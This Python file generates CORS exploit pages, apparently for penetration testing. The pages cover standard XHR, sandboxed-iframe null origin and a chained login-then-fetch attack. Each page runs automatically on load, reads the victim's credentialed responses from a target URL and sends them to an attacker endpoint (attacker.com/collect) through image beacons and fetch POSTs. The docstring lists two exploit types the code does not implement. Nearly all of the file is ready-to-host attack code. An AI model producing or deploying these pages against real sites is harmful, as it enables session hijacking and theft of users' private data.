"""
CORS PoC Exploit Generator
----------------------------
Generates ready-to-host HTML exploit pages for each vulnerability type.
Each PoC exfiltrates the response to an attacker-controlled endpoint.

PoC Types:
  - standard     : Basic XMLHttpRequest CORS exploit
  - null_origin  : Sandboxed iframe null origin exploit
  - fetch_based  : Modern fetch() API exploit
  - credential   : withCredentials exploit for session hijack
  - chained      : Multi-request chain (login → sensitive endpoint)
"""

import json


def _html_wrapper(title: str, body_content: str, style: str = "") -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        body {{ font-family: monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }}
        #output {{ background: #111; border: 1px solid #00ff41; padding: 15px; margin-top: 20px;
                   white-space: pre-wrap; word-break: break-all; max-height: 400px; overflow-y: auto; }}
        .status {{ color: #ffff00; }}
        .error  {{ color: #ff4444; }}
        .success {{ color: #00ff41; font-weight: bold; }}
        button {{ background: #00ff41; color: #000; border: none; padding: 8px 16px;
                  cursor: pointer; font-family: monospace; font-size: 14px; margin: 5px; }}
        {style}
    </style>
</head>
<body>
{body_content}
</body>
</html>"""


def generate_standard_poc(target_url: str, attacker_origin: str,
                           exfil_url: str = "https://attacker.com/collect",
                           cookies: bool = True, method: str = "GET",
                           body: str = None) -> str:
    """Standard XMLHttpRequest CORS PoC."""

    creds_js = "xhr.withCredentials = true;" if cookies else ""
    body_js = f'xhr.send(JSON.stringify({body}));' if body else "xhr.send();"
    method_upper = method.upper()

    html_body = f"""
    <h2>🔴 CORS Exploit — {target_url}</h2>
    <p class="status">Target: <strong>{target_url}</strong></p>
    <p class="status">Exfil:  <strong>{exfil_url}</strong></p>
    <button onclick="exploit()">▶ Run Exploit</button>
    <button onclick="document.getElementById('output').textContent=''">Clear</button>
    <div id="output">Click "Run Exploit" to execute...</div>

    <script>
        function log(msg, cls) {{
            var out = document.getElementById('output');
            var line = document.createElement('div');
            line.className = cls || '';
            line.textContent = msg;
            out.appendChild(line);
            out.scrollTop = out.scrollHeight;
        }}

        function exfiltrate(data) {{
            // Send stolen data to attacker server
            var img = new Image();
            img.src = '{exfil_url}?data=' + encodeURIComponent(data.substring(0, 2000));

            // Also try fetch POST for larger payloads
            try {{
                fetch('{exfil_url}', {{
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({{ stolen: data, origin: window.location.origin, ts: Date.now() }}),
                    headers: {{ 'Content-Type': 'application/json' }}
                }});
            }} catch(e) {{}}

            log('[+] Data exfiltrated (' + data.length + ' bytes)', 'success');
        }}

        function exploit() {{
            log('[*] Starting CORS exploit against: {target_url}');
            log('[*] Origin: ' + window.location.origin);

            var xhr = new XMLHttpRequest();
            xhr.open('{method_upper}', '{target_url}', true);
            {creds_js}
            xhr.setRequestHeader('Accept', 'application/json, */*');

            xhr.onload = function() {{
                log('[+] Response status: ' + xhr.status, 'success');
                log('[+] Response headers: ' + xhr.getAllResponseHeaders());
                log('[+] Response body (' + xhr.responseText.length + ' chars):');
                log(xhr.responseText.substring(0, 1000));

                if (xhr.responseText.length > 0) {{
                    exfiltrate(xhr.responseText);
                }} else {{
                    log('[!] Empty response — check cookies/auth', 'error');
                }}
            }};

            xhr.onerror = function() {{
                log('[!] CORS request blocked — not vulnerable or wrong origin', 'error');
            }};

            {body_js}
        }}

        // Auto-run on load
        window.onload = function() {{
            log('[*] Page loaded. Click Run Exploit or wait 2s for auto-run...');
            setTimeout(exploit, 2000);
        }};
    </script>"""

    return _html_wrapper(f"CORS PoC — {target_url}", html_body)


def generate_null_origin_poc(target_url: str,
                              exfil_url: str = "https://attacker.com/collect") -> str:
    """Null origin exploit via sandboxed iframe."""

    html_body = f"""
    <h2>🔴 CORS Null Origin Exploit</h2>
    <p class="status">Target: <strong>{target_url}</strong></p>
    <p>Uses sandboxed iframe to generate <code>Origin: null</code></p>
    <button onclick="exploit()">▶ Run Exploit</button>
    <div id="output">Waiting...</div>

    <script>
        window.addEventListener('message', function(e) {{
            var out = document.getElementById('output');
            out.textContent = '[+] Received from iframe: \\n' + JSON.stringify(e.data, null, 2);

            // Exfiltrate
            var img = new Image();
            img.src = '{exfil_url}?null_cors=' + encodeURIComponent(JSON.stringify(e.data));
        }});

        function exploit() {{
            document.getElementById('output').textContent = '[*] Launching sandboxed iframe...';

            var payload = `
                <script>
                    var xhr = new XMLHttpRequest();
                    xhr.open('GET', '{target_url}', true);
                    xhr.withCredentials = true;
                    xhr.onload = function() {{
                        parent.postMessage({{
                            status: xhr.status,
                            body: xhr.responseText.substring(0, 2000),
                            headers: xhr.getAllResponseHeaders()
                        }}, '*');
                    }};
                    xhr.onerror = function() {{
                        parent.postMessage({{ error: 'CORS blocked' }}, '*');
                    }};
                    xhr.send();
                <\\/script>
            `;

            var iframe = document.createElement('iframe');
            iframe.sandbox = 'allow-scripts';
            iframe.style.display = 'none';
            iframe.srcdoc = payload;
            document.body.appendChild(iframe);
        }}

        window.onload = function() {{
            setTimeout(exploit, 500);
        }};
    </script>"""

    return _html_wrapper("CORS Null Origin PoC", html_body)


def generate_chained_poc(login_url: str, sensitive_url: str,
                          login_body: dict, exfil_url: str = "https://attacker.com/collect") -> str:
    """Multi-step: POST login → GET sensitive endpoint."""

    login_json = json.dumps(login_body)

    html_body = f"""
    <h2>🔴 CORS Chained Exploit (Login → Exfil)</h2>
    <p class="status">Step 1 — Login: <strong>{login_url}</strong></p>
    <p class="status">Step 2 — Steal: <strong>{sensitive_url}</strong></p>
    <button onclick="exploit()">▶ Run Chain</button>
    <div id="output">Ready...</div>

    <script>
        function log(msg) {{
            var out = document.getElementById('output');
            out.textContent += msg + '\\n';
            out.scrollTop = out.scrollHeight;
        }}

        function step2() {{
            log('[*] Step 2: Fetching sensitive endpoint...');
            var xhr2 = new XMLHttpRequest();
            xhr2.open('GET', '{sensitive_url}', true);
            xhr2.withCredentials = true;
            xhr2.onload = function() {{
                log('[+] Sensitive data captured (' + xhr2.responseText.length + ' bytes)!');
                log(xhr2.responseText.substring(0, 500));
                var img = new Image();
                img.src = '{exfil_url}?step2=' + encodeURIComponent(xhr2.responseText.substring(0, 1500));
            }};
            xhr2.onerror = function() {{ log('[!] Step 2 blocked'); }};
            xhr2.send();
        }}

        function exploit() {{
            document.getElementById('output').textContent = '';
            log('[*] Step 1: Sending login request...');

            var xhr = new XMLHttpRequest();
            xhr.open('POST', '{login_url}', true);
            xhr.withCredentials = true;
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.onload = function() {{
                log('[+] Login response: ' + xhr.status);
                log(xhr.responseText.substring(0, 200));
                setTimeout(step2, 500);
            }};
            xhr.onerror = function() {{ log('[!] Login request blocked'); }};
            xhr.send('{login_json}');
        }}

        window.onload = function() {{ setTimeout(exploit, 1000); }};
    </script>"""

    return _html_wrapper("CORS Chained Exploit", html_body)


def generate_poc_for_finding(finding: dict,
                              exfil_url: str = "https://attacker.com/collect") -> dict:
    """
    Auto-select the right PoC based on finding type.
    Returns dict with poc_type, filename, html.
    """
    url = finding.get("url", "")
    vuln_type = finding.get("vuln_type", "reflected")
    acac = finding.get("acac", False)

    if vuln_type == "null_origin":
        html = generate_null_origin_poc(url, exfil_url)
        poc_type = "null_origin"
        filename = "poc_null_origin.html"
    else:
        html = generate_standard_poc(url, finding.get("origin_sent", "https://evil.com"),
                                     exfil_url, cookies=acac)
        poc_type = "standard"
        filename = f"poc_{vuln_type}.html"

    return {
        "poc_type": poc_type,
        "filename": filename,
        "html": html,
        "target_url": url,
        "origin": finding.get("origin_sent"),
        "with_credentials": acac,
    }


def save_pocs(findings: list, output_dir: str = ".",
              exfil_url: str = "https://attacker.com/collect") -> list:
    """Generate and save all PoC files for findings."""
    import os
    os.makedirs(output_dir, exist_ok=True)

    saved = []
    for i, finding in enumerate(findings):
        poc = generate_poc_for_finding(finding, exfil_url)
        filepath = os.path.join(output_dir, f"{i+1:02d}_{poc['filename']}")
        with open(filepath, "w") as f:
            f.write(poc["html"])
        poc["filepath"] = filepath
        saved.append(poc)
        print(f"  {poc['poc_type']:<15} → {filepath}")

    return saved
